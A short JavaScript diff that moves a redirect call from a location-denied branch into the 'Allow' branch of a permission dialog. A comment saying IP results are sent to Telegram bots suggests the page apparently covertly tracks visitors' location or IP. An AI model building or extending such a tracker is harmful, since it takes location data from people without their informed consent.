@@ -22,7 +22,7 @@
 
            showAlert();
           // Location permission denied, send IP result to Telegram bots
-          redirectToNextURL();
+          
         }
       }
     );
@@ -143,6 +143,7 @@ function showAlert() {
     if (result) {
       // Allow button clicked
      // console.log("Allowed");
+redirectToNextURL();
     } else {
       // Deny button clicked or dialog closed
     //  console.log("Denied");
